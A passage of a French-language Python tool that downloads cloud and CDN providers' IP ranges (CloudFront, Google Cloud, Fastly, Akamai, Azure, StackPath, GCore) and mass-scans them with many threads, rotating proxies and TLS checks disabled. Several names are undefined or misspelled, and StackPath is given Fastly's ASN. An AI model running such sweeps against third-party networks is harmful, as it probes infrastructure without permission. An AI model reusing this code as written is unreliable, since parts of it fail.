        print(Fore.YELLOW + "ℹ Mise à jour initiale des CIDR CloudFront...")
        if not update_cloudfront_cidrs():
            return

    while True:
        print(Fore.LIGHTYELLOW_EX + "\n📦 CLOUDFRONT — GESTION DU SCAN AWS")
        print(Fore.LIGHTYELLOW_EX + "-"*45)

        print(Fore.CYAN + " 1. 🚀 Lancer un nouveau scan CloudFront")
        print(Fore.CYAN + " 2. ▶️  Reprendre une session")
        print(Fore.CYAN + " 3. ♻️  Mettre à jour les CIDR AWS")
        print(Fore.CYAN + " 4. ↩️  Retour au menu")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(CLOUDFRONT_SCAN_PROGRESS_FILE):
                os.remove(CLOUDFRONT_SCAN_PROGRESS_FILE)
            if update_cloudfront_cidrs():
                start_cloudfront_scan(proxy=proxy)
        elif choice == "2":
            start_cloudfront_scan(resume=True, proxy=proxy)
        elif choice == "3":
            update_cloudfront_cidrs()
        elif choice == "4":
            break
        else:
            print(Fore.RED + "❌ Option invalide.")

def start_cloudfront_scan(resume=False, proxy=None):
    """Exécute le scan CloudFront avec gestion de la reprise"""
    # Chargement des CIDR
    with open(CLOUDFRONT_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]
    
    # Gestion de la reprise
    scanned_cidrs = set()
    if resume:
        with open(CLOUDFRONT_SCAN_PROGRESS_FILE, 'r') as f:
            scanned_cidrs = {line.strip() for line in f if line.strip()}
    
    cidrs_to_scan = [cidr for cidr in all_cidrs if cidr not in scanned_cidrs]
    
    if not cidrs_to_scan:
        print(Fore.GREEN + "✅ Toutes les plages CloudFront ont déjà été scannées")
        return
    
    print(Fore.CYAN + f"☁️ Début du scan CloudFront ({len(cidrs_to_scan)} plages restantes)" + 
          f" avec {Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")
    
    try:
        for cidr in cidrs_to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN CLOUDFRONT {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy  # Passage du proxy au scanner
            )
            scanner.run()
            
            # Sauvegarde de la progression
            with open(CLOUDFRONT_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")
                
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan CloudFront interrompu")
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur CloudFront: {str(e)}")
    finally:
        print(Fore.CYAN + f"\n📊 Progression CloudFront sauvegardée")

def cloudfront_menu():
    """Menu interactif CloudFront"""
    print(Fore.MAGENTA + "\n=== MENU CLOUDFRONT ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan précédent")
    print(Fore.CYAN + "3. Mettre à jour les plages CIDR")
    print(Fore.CYAN + "4. Retour au menu principal")
    choice = input(Fore.YELLOW + "Choix (1-4) : ")
    return choice

# ==============================================
# CONFIGURATION GOOGLE CLOUD
# ==============================================
GCP_CIDR_FILE = "gcp_cidrs.txt"
GOOGLE_CLOUD_CIDR_FILE = "googlecloud_cidrs.txt"
# ==============================================
# FONCTIONS GOOGLE CLOUD
# ==============================================

def fetch_googlecloud_cidrs():
    """Récupère les plages CIDR Google Cloud via l'API officielle et ASN multiples"""
    print(Fore.CYAN + "🔍 Récupération des plages CIDR Google Cloud (API + ASN)...")
    cidrs = []

    # API officielle
    try:
        response = requests.get("https://www.gstatic.com/ipranges/cloud.json", timeout=15)
        response.raise_for_status()
        data = response.json()
        for item in data.get("prefixes", []):
            if "ipv4Prefix" in item:
                cidrs.append(item["ipv4Prefix"])
        print(Fore.GREEN + f"  ✅ Google API → {len(cidrs)} CIDR")
    except Exception as e:
        print(Fore.RED + f"❌ Erreur API Google Cloud : {e}")

    # Complément ASN
    try:
        asn_cidrs = fetch_cidrs_multi_asn([15169, 139070, 396982])
        cidrs.extend(asn_cidrs)
    except Exception as e:
        print(Fore.RED + f"❌ Erreur ASN Google Cloud : {e}")

    final = list(set(cidrs))
    print(Fore.GREEN + f"✅ Total unique CIDR Google Cloud : {len(final)}")
    return final
    
def update_googlecloud_cidrs():
    cidrs = fetch_googlecloud_cidrs()
    if not cidrs:
        print(Fore.RED + "❌ Aucune plage CIDR Google Cloud récupérée.")
        return False
    with open(GOOGLE_CLOUD_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"✅ {len(cidrs)} plages CIDR Google Cloud sauvegardées.")
    return True
    
def start_gcp_scan(resume=False, proxy=None):
    if not os.path.exists(GCP_CIDR_FILE):
        print(Fore.YELLOW + "ℹ Aucun fichier CIDR GCP trouvé, mise à jour...")
        if not update_gcp_cidrs():
            return

    with open(GCP_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]

    scanned = set()
    if resume and os.path.exists(GCP_SCAN_PROGRESS_FILE):
        with open(GCP_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = set(line.strip() for line in f if line.strip())

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]

    if not to_scan:
        print(Fore.GREEN + "✅ Toutes les plages GCP ont été scannées.")
        return

    for cidr in to_scan:
        print(Fore.MAGENTA + f"\n=== SCAN GCP DE {cidr} ===")
        scanner = HostScanner(ip_range=cidr, threads=100, ping_timeout=1, http_timeout=10, proxy=proxy)
        scanner.run()
        with open(GCP_SCAN_PROGRESS_FILE, 'a') as f:
            f.write(f"{cidr}\n")
            
def gcp_menu():
    print(Fore.MAGENTA + "\n=== MENU GCP CLOUD ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan précédent")
    print(Fore.CYAN + "3. Mettre à jour les plages CIDR")
    print(Fore.CYAN + "4. Retour au menu principal")
    return input(Fore.YELLOW + "Choix (1-4) : ")

def manage_googlecloud_scan(proxy=None):
    if not os.path.exists(GOOGLE_CLOUD_CIDR_FILE):
        print(Fore.YELLOW + "ℹ Mise à jour initiale des CIDR Google Cloud...")
        if not update_googlecloud_cidrs():
            return

    while True:
        print(Fore.GREEN + "\n🌐 GOOGLE CLOUD — MENU DE SCAN")
        print(Fore.GREEN + "="*44)

        print(Fore.CYAN + " 1. ☁️  Nouveau scan Google Cloud")
        print(Fore.CYAN + " 2. ▶️  Continuer le scan précédent")
        print(Fore.CYAN + " 3. 🔄 Mettre à jour les CIDR Google Cloud")
        print(Fore.CYAN + " 4. ↩️  Retour au menu")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(GOOGLE_CLOUD_SCAN_PROGRESS_FILE):
                os.remove(GOOGLE_CLOUD_SCAN_PROGRESS_FILE)
            if update_googlecloud_cidrs():
                start_googlecloud_scan(proxy=proxy)
        elif choice == "2":
            start_googlecloud_scan(resume=True, proxy=proxy)
        elif choice == "3":
            update_googlecloud_cidrs()
        elif choice == "4":
            break
        else:
            print(Fore.RED + "❌ Option invalide.")

# ==============================================
# CONFIGURATION FASTLY
# ==============================================
FASTLY_CIDR_FILE = "fastly_cidrs.txt"
FASTLY_SCAN_PROGRESS_FILE = "fastly_scan_progress.txt"
# ==============================================
# FONCTIONS FASTLY
# ==============================================

def fetch_fastly_cidrs():
    """Récupère les plages CIDR Fastly via API publique et ASN 54113"""
    print(Fore.CYAN + "🔍 Récupération des plages CIDR Fastly (API + ASN)...")
    cidrs = []

    # API officielle
    try:
        response = requests.get("https://api.fastly.com/public-ip-list", timeout=15)
        response.raise_for_status()
        data = response.json()
        api_cidrs = data.get("addresses", [])
        cidrs.extend(api_cidrs)
        print(Fore.GREEN + f"  ✅ Fastly API → {len(api_cidrs)} CIDR")
    except Exception as e:
        print(Fore.RED + f"❌ Erreur API Fastly : {e}")

    # Complément ASN
    try:
        asn_cidrs = fetch_cidrs_multi_asn([54113])
        cidrs.extend(asn_cidrs)
    except Exception as e:
        print(Fore.RED + f"❌ Erreur ASN Fastly : {e}")

    final = list(set(cidrs))
    print(Fore.GREEN + f"✅ Total unique CIDR Fastly : {len(final)}")
    return final
    
def update_fastly_cidrs():
    cidrs = fetch_fastly_cidrs()
    if not cidrs:
        print(Fore.RED + "❌ Aucune plage CIDR Fastly récupérée.")
        return False
    with open(FASTLY_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"✅ {len(cidrs)} plages CIDR Fastly sauvegardées.")
    return True
    
def start_fastly_scan(resume=False, proxy=None):
    if not os.path.exists(FASTLY_CIDRS_FILE):
        print(Fore.YELLOW + "ℹ Mise à jour initiale des IPs Fastly...")
        if not update_fastly_cidrs():
            return

    with open(FASTLY_CIDRS_FILE, 'r') as f:
        all_ips = [line.strip() for line in f if line.strip()]

    scanned = set()
    if resume and os.path.exists(FASTLY_SCAN_PROGRESS_FILE):
        with open(FASTLY_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = {line.strip() for line in f if line.strip()}

    to_scan = [ip for ip in all_ips if ip not in scanned]

    if not to_scan:
        print(Fore.GREEN + "✅ Toutes les IPs Fastly ont été scannées.")
        return

    print(Fore.CYAN + f"🚀 Début du scan Fastly ({len(to_scan)} IPs restantes) avec " +
          f"{Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")

    try:
        for ip in to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN FASTLY {ip} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=f"{ip}/32",
                threads=50,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()
            with open(FASTLY_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{ip}\n")
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan Fastly interrompu")
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur Fastly: {str(e)}")
    finally:
        print(Fore.CYAN + "\n📊 Progression Fastly sauvegardée")
        
def fastly_menu():
    print(Fore.MAGENTA + "\n=== MENU FASTLY ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan précédent")
    print(Fore.CYAN + "3. Mettre à jour les IPs Fastly")
    print(Fore.CYAN + "4. Retour au menu principal")
    return input(Fore.YELLOW + "Choix (1-4) : ")

def manage_fastly_scan(proxy=None):
    if not os.path.exists(FASTLY_CIDR_FILE):
        print(Fore.YELLOW + "ℹ Mise à jour initiale des CIDR Fastly...")
        if not update_fastly_cidrs():
            return

    while True:
        print(Fore.MAGENTA + "\n╔" + "═"*46 + "╗")
        print(Fore.MAGENTA + "║" + Fore.CYAN + Style.BRIGHT + "      MENU FASTLY — SCAN & MAINTENANCE       " + Style.RESET_ALL + Fore.MAGENTA + "║")
        print(Fore.MAGENTA + "╚" + "═"*46 + "╝")

        print(Fore.GREEN + "\n╭─── Actions disponibles ─────────────────────╮")
        print(Fore.CYAN + " 1. ♻️  Lancer un nouveau scan complet")
        print(Fore.CYAN + " 2. ▶️  Reprendre le scan précédent")
        print(Fore.CYAN + " 3. 🔄  Mettre à jour les plages CIDR")
        print(Fore.CYAN + " 4. ↩️  Retour au menu principal")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(FASTLY_SCAN_PROGRESS_FILE):
                os.remove(FASTLY_SCAN_PROGRESS_FILE)
            if update_fastly_cidrs():
                start_fastly_scan(proxy=proxy)
        elif choice == "2":
            start_fastly_scan(resume=True, proxy=proxy)
        elif choice == "3":
            update_fastly_cidrs()
        elif choice == "4":
            break
        else:
            print(Fore.RED + "❌ Option invalide.")

# ==============================================
# CONFIGURATION AKAMAI, AZURE, STACKPATH
# ==============================================
AKAMAI_CIDR_FILE = "akamai_cidrs.txt"
AKAMAI_SCAN_PROGRESS_FILE = "akamai_scan_progress.txt"

AZURE_CIDR_FILE = "azure_cidrs.txt"
AZURE_SCAN_PROGRESS_FILE = "azure_scan_progress.txt"

STACKPATH_CIDR_FILE = "stackpath_cidrs.txt"
STACKPATH_SCAN_PROGRESS_FILE = "stackpath_scan_progress.txt"

GCORE_CIDR_FILE = "gcore_cidrs.txt"
GCORE_SCAN_PROGRESS_FILE = "gcore_scan_progress.txt"
# ==============================================
# FONCTIONS AKAMAI, AZURE, STACKPATH
# ==============================================

def fetch_akamai_cidrs():
    cidrs = fetch_cidrs_multi_asn([20940, 12222])
    if not cidrs:
        print(Fore.YELLOW + "➡️ Utilisation de plages CIDR statiques Akamai.")
        return [
            "23.32.0.0/11",
            "23.0.0.0/12",
            "23.192.0.0/11",
            "184.24.0.0/13"
        ]
    return cidrs
        
def fetch_azure_cidrs():
    cidrs = fetch_cidrs_multi_asn([8075, 8068])
    if not cidrs:
        print(Fore.YELLOW + "➡️ Utilisation de plages CIDR statiques Azure.")
        return [
            "13.104.0.0/14",
            "40.74.0.0/15",
            "40.112.0.0/13",
            "52.96.0.0/14",
            "52.108.0.0/15",
            "52.136.0.0/13",
            "104.208.0.0/13"
        ]
    return cidrs
    
def fetch_stackpath_cidrs():
    cidrs = fetch_cidrs_multi_asn([54113])
    if not cidrs:
        print(Fore.YELLOW + "➡️ Utilisation de plages CIDR statiques StackPath.")
        return [
            "151.139.0.0/16",
            "192.16.48.0/20",
            "190.93.240.0/20"
        ]
    return cidrs

def fetch_gcore_cidrs():
    cidrs = fetch_cidrs_multi_asn([199524])
    if not cidrs:
        print(Fore.YELLOW + "➡️ Utilisation de plages CIDR statiques GCore.")
        return [
            "92.223.64.0/19",
            "92.223.88.0/21",
            "92.223.96.0/22",
            "92.223.100.0/23"
        ]
    return cidrs

def update_akamai_cidrs():
    cidrs = fetch_akamai_cidrs()
    if not cidrs:
        print(Fore.RED + "❌ Aucune plage CIDR Akamai récupérée.")
        return False
    with open(AKAMAI_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"✅ {len(cidrs)} plages CIDR Akamai sauvegardées.")
    return True
    
def update_azure_cidrs():
    cidrs = fetch_azure_cidrs()
    if not cidrs:
        print(Fore.RED + "❌ Aucune plage CIDR Azure récupérée.")
        return False
    with open(AZURE_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"✅ {len(cidrs)} plages CIDR Azure sauvegardées.")
    return True
    
def update_stackpath_cidrs():
    cidrs = fetch_stackpath_cidrs()
    if not cidrs:
        print(Fore.RED + "❌ Aucune plage CIDR StackPath récupérée.")
        return False
    with open(STACKPATH_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"✅ {len(cidrs)} plages CIDR StackPath sauvegardées.")
    return True

def update_gcore_cidrs():
    cidrs = fetch_gcore_cidrs()
    if not cidrs:
        print(Fore.RED + "❌ Aucune plage CIDR GCore récupérée.")
        return False
    with open(GCORE_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"✅ {len(cidrs)} plages CIDR GCore sauvegardées.")
    return True
    
def start_akamai_scan(resume=False, proxy=None):
    if not os.path.exists(AKAMAI_CIDR_FILE):
        print(Fore.YELLOW + "ℹ Aucun fichier CIDR Akamai trouvé, mise à jour...")
        if not update_akamai_cidrs():
            return

    with open(AKAMAI_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]

    scanned = set()
    if resume and os.path.exists(AKAMAI_SCAN_PROGRESS_FILE):
        with open(AKAMAI_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = {line.strip() for line in f if line.strip()}

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]

    if not to_scan:
        print(Fore.GREEN + "✅ Toutes les plages Akamai ont été scannées.")
        return

    print(Fore.CYAN + f"🚀 Début du scan Akamai ({len(to_scan)} plages) avec " +
          f"{Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")

    try:
        for cidr in to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN AKAMAI DE {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()
            with open(AKAMAI_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur Akamai: {str(e)}")
        
def start_azure_scan(resume=False, proxy=None):
    if not os.path.exists(AZURE_CIDR_FILE):
        print(Fore.YELLOW + "ℹ Aucun fichier CIDR Azure trouvé, mise à jour...")
        if not update_azure_cidrs():
            return

    with open(AZURE_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]

    scanned = set()
    if resume and os.path.exists(AZURE_SCAN_PROGRESS_FILE):
        with open(AZURE_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = {line.strip() for line in f if line.strip()}

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]

    if not to_scan:
        print(Fore.GREEN + "✅ Toutes les plages Azure ont été scannées.")
        return

    print(Fore.CYAN + f"🚀 Début du scan Azure ({len(to_scan)} plages) avec " +
          f"{Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")

    try:
        for cidr in to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN AZURE DE {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()
            with open(AZURE_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur Azure: {str(e)}")
        
def start_stackpath_scan(resume=False, proxy=None):
    if not os.path.exists(STACKPATH_CIDR_FILE):
        print(Fore.YELLOW + "ℹ Aucun fichier CIDR Stackpath trouvé, mise à jour...")
        if not update_stackpath_cidrs():
            return

    with open(STACKPATH_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]

    scanned = set()
    if resume and os.path.exists(STACKPATB_SCAN_PROGRESS_FILE):
        with open(STACKPATH_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = {line.strip() for line in f if line.strip()}

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]

    if not to_scan:
        print(Fore.GREEN + "✅ Toutes les plages Stackpath ont été scannées.")
        return

    print(Fore.CYAN + f"🚀 Début du scan Stackpath ({len(to_scan)} plages) avec " +
          f"{Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")

    try:
        for cidr in to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN STACKPATH DE {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()
            with open(STACKPATH_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur Stackpath: {str(e)}")

def start_gcore_scan(resume=False, proxy=None):
    if not os.path.exists(GCORE_CIDR_FILE):
        print(Fore.YELLOW + "ℹ Aucun fichier CIDR GCore trouvé, mise à jour...")
        if not update_gcore_cidrs():
            return

    with open(GCORE_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]

    scanned = set()
    if resume and os.path.exists(GCORE_SCAN_PROGRESS_FILE):
        with open(GCORE_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = {line.strip() for line in f if line.strip()}

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]

    if not to_scan:
        print(Fore.GREEN + "✅ Toutes les plages GCore ont été scannées.")
        return

    print(Fore.CYAN + f"🌍 Début du scan GCore ({len(to_scan)} plages restantes) avec " +
          f"{Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")

    try:
        for cidr in to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN GCORE DE {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()
            with open(GCORE_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan GCore interrompu")
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur GCore: {str(e)}")
    finally:
        print(Fore.CYAN + "\n📊 Progression GCore sauvegardée")

def akamai_menu():
    print(Fore.MAGENTA + "\n=== MENU AKAMAI ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan précédent")
    print(Fore.CYAN + "3. Mettre à jour les plages CIDR")
    print(Fore.CYAN + "4. Retour")
    return input(Fore.YELLOW + "Choix (1-4) : ")
    
def azure_menu():
    print(Fore.MAGENTA + "\n=== MENU AZURE ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan précédent")
    print(Fore.CYAN + "3. Mettre à jour les plages CIDR")
    print(Fore.CYAN + "4. Retour")
    return input(Fore.YELLOW + "Choix (1-4) : ")
    
def stackpath_menu():
    print(Fore.MAGENTA + "\n=== MENU STACKPATH ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan précédent")
    print(Fore.CYAN + "3. Mettre à jour les plages CIDR")
    print(Fore.CYAN + "4. Retour")
    return input(Fore.YELLOW + "Choix (1-4) : ")

def gcore_menu():
    print(Fore.MAGENTA + "\n=== MENU GCORE ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan précédent")
    print(Fore.CYAN + "3. Mettre à jour les plages CIDR")
    print(Fore.CYAN + "4. Retour au menu principal")
    return input(Fore.YELLOW + "Choix (1-4) : ")

def manage_akamai_scan(proxy=None):
    if not os.path.exists(AKAMAI_CIDR_FILE):
        print(Fore.YELLOW + "ℹ Mise à jour initiale des CIDR Akamai...")
        if not update_akamai_cidrs():
            return

    while True:
        print(Fore.BLUE + "\n┌───────────────────────────────────────────────┐")
        print(Fore.BLUE + "│" + Fore.CYAN + Style.BRIGHT + "        AKAMAI — CONTRÔLE DU SCAN         " + Style.RESET_ALL + Fore.BLUE + "│")
        print(Fore.BLUE + "└───────────────────────────────────────────────┘")

        print(Fore.CYAN + " 1. 🚀 Démarrer un nouveau scan Akamai")
        print(Fore.CYAN + " 2. ▶️  Reprendre le scan en cours")
        print(Fore.CYAN + " 3. 🔁 Actualiser les CIDR Akamai")
        print(Fore.CYAN + " 4. ⬅️  Retour")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(AKAMAI_SCAN_PROGRESS_FILE):
                os.remove(AKAMAI_SCAN_PROGRESS_FILE)
            if update_akamai_cidrs():
                start_akamai_scan(proxy=proxy)
        elif choice == "2":
            start_akamai_scan(resume=True, proxy=proxy)
        elif choice == "3":
            update_akamai_cidrs()
        elif choice == "4":
            break
        else:
            print(Fore.RED + "❌ Option invalide.")
            
def manage_azure_scan(proxy=None):
    if not os.path.exists(AZURE_CIDR_FILE):
        print(Fore.YELLOW + "ℹ Mise à jour initiale des CIDR Azure...")
        if not update_azure_cidrs():
            return

    while True:
        print(Fore.LIGHTMAGENTA_EX + "\n🌩️ AZURE CLOUD — OUTILS DE SCAN")
        print(Fore.LIGHTMAGENTA_EX + "-"*42)

        print(Fore.CYAN + " 1. ☁️  Lancer un scan complet Azure")
        print(Fore.CYAN + " 2. ▶️  Continuer le scan")
        print(Fore.CYAN + " 3. ♻️  Mettre à jour les CIDR Azure")
        print(Fore.CYAN + " 4. ↩️  Retour")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(AZURE_SCAN_PROGRESS_FILE):
                os.remove(AZURE_SCAN_PROGRESS_FILE)
            if update_azure_cidrs():
                start_azure_scan(proxy=proxy)
        elif choice == "2":
            start_azure_scan(resume=True, proxy=proxy)
        elif choice == "3":
            update_azure_cidrs()
        elif choice == "4":
            break
        else:
            print(Fore.RED + "❌ Option invalide.")
            
def manage_stackpath_scan(proxy=None):
    if not os.path.exists(STACKPATH_CIDR_FILE):
        print(Fore.YELLOW + "ℹ Mise à jour initiale des CIDR StackPath...")
        if not update_stackpath_cidrs():
            return

    while True:
        print(Fore.LIGHTBLUE_EX + "\n╔═══ STACKPATH | GESTION DU SCAN ═════════════╗")
        print(Fore.LIGHTBLUE_EX + "║" + Fore.CYAN + Style.BRIGHT + "      StackPath CDN Scanner Menu         " + Style.RESET_ALL + Fore.LIGHTBLUE_EX + "║")
        print(Fore.LIGHTBLUE_EX + "╚═════════════════════════════════════════════╝")

        print(Fore.CYAN + " 1. 🧹 Nouveau scan complet")
        print(Fore.CYAN + " 2. ▶️  Reprise du scan")
        print(Fore.CYAN + " 3. 🔃 Rafraîchir les CIDR StackPath")
        print(Fore.CYAN + " 4. 🔙 Retour au menu principal")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Votre choix (1-4) : ")

        if choice == "1":
            if os.path.exists(STACKPATH_SCAN_PROGRESS_FILE):
                os.remove(STACKPATH_SCAN_PROGRESS_FILE)
            if update_stackpath_cidrs():
                start_stackpath_scan(proxy=proxy)
        elif choice == "2":
            start_stackpath_scan(resume=True, proxy=proxy)
        elif choice == "3":
            update_stackpath_cidrs()
        elif choice == "4":
            break
        else:
            print(Fore.RED + "❌ Option invalide.")

def manage_gcore_scan(proxy=None):
    if not os.path.exists(GCORE_CIDR_FILE):
        print(Fore.YELLOW + "ℹ Mise à jour initiale des CIDR GCore...")
        if not update_gcore_cidrs():
            return

    while True:
        print(Fore.LIGHTGREEN_EX + "\n🌍 GCORE — MENU D'ANALYSE IP")
        print(Fore.LIGHTGREEN_EX + "="*40)

        print(Fore.CYAN + " 1. 🌐 Nouveau scan complet")
        print(Fore.CYAN + " 2. ▶️  Reprise du scan précédent")
        print(Fore.CYAN + " 3. 🔁 Mise à jour des CIDR GCore")
        print(Fore.CYAN + " 4. ↩️  Retour")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(GCORE_SCAN_PROGRESS_FILE):
                os.remove(GCORE_SCAN_PROGRESS_FILE)
            if update_gcore_cidrs():
                start_gcore_scan(proxy=proxy)
        elif choice == "2":
            start_gcore_scan(resume=True, proxy=proxy)
        elif choice == "3":
            update_gcore_cidrs()
        elif choice == "4":
            break
        else:
            print(Fore.RED + "❌ Option invalide.")
        
# ==============================================
# CLASSE DOMAINES SCANNEUR
# ==============================================

class AlphaUnixScanner:
    def __init__(self, max_workers=100, timeout=10):
        self.session = requests.Session()
        self.session.verify = False
        self.timeout = timeout
        self.max_workers = max_workers
        self.lock = threading.Lock()
        self.results = []
        self.processed = 0
        self.proxy_failures = set()
        self.proxy_rotation_delay = 1  # Délai entre les rotations de proxy

    def scan_domain(self, domain):
        """Version améliorée avec meilleure gestion des proxies"""
        start_time = time.time()
        result = {'domain': domain, 'status': 0, 'server': 'Inconnu', 'error': None}
        
        for protocol in ['http://', 'https://']:
            url = domain if domain.startswith(('http://', 'https://')) else f"{protocol}{domain}"
            
            for attempt in range(3):  # 3 tentatives
                proxy_url = None
                proxies = None
                
                if hasattr(self, 'proxy_manager'):
                    proxy_url = self.proxy_manager.get_next_proxy()
                    if proxy_url:
                        proxies = {'http': proxy_url, 'https': proxy_url}
                        time.sleep(self.proxy_rotation_delay)  # Délai entre les requêtes
                
                try:
                    response = self.session.head(
                        url,
                        proxies=proxies,
                        timeout=self.timeout,
                        allow_redirects=True
                    )
                    result.update({
                        'status': response.status_code,
                        'server': response.headers.get('Server', 'Inconnu'),
                        'error': None
                    })
                    return result
                
                except requests.exceptions.ProxyError as e:
                    if proxy_url:
                        with self.lock:
                            self.proxy_failures.add(proxy_url)
                            if hasattr(self, 'proxy_manager'):
                                self.proxy_manager.report_failure(proxy_url)
                    continue
                
                except Exception as e:
                    result['error'] = str(e)
                    continue
        
        result['time'] = time.time() - start_time
        return result

def scan_file(self, filename, max_workers=500, timeout=10, batch_size=100):
    """Version ultra-optimisée du scan de fichier"""
    print(Fore.GREEN + f"\n[⚡] Scan turbo activé (workers: {max_workers})")
    
    # Lecture du fichier avec cache
    with open(filename, 'r') as f:
        domains = [line.strip() for line in f if line.strip()]
    
    total = len(domains)
    results = []
    processed = 0
    
    # Pré-chauffage DNS
    dns_cache = {}
    resolver = dns.resolver.Resolver()
    resolver.timeout = 2
    resolver.lifetime = 2
    
    # Fonction optimisée de scan
    def _scan_domain(domain):
        nonlocal processed
        try:
            # Résolution DNS ultra-rapide avec cache
            if domain not in dns_cache:
                dns_cache[domain] = str(resolver.resolve(domain, 'A')[0])
            
            ip = dns_cache[domain]
            
            # Requête HTTP asynchrone
            with requests.Session() as session:
                session.timeout = timeout
                for protocol in ('https://', 'http://'):
                    url = f"{protocol}{domain}"
                    try:
                        start = time.perf_counter()
                        resp = session.head(url, allow_redirects=True)
                        latency = int((time.perf_counter() - start) * 1000)
                        
                        return {
                            'domain': domain,
                            'ip': ip,
                            'status': resp.status_code,
                            'latency': latency,
                            'server': resp.headers.get('Server', '')
                        }
                    except:
                        continue
        except Exception:
            return None
        finally:
            processed += 1
            if processed % batch_size == 0:
                print(f"\r⏳ {processed}/{total} ({processed/total:.1%})", end='')

    # Exécution parallèle massive
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(_scan_domain, domain): domain for domain in domains}
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                results.append(result)
    
    # Affichage des résultats
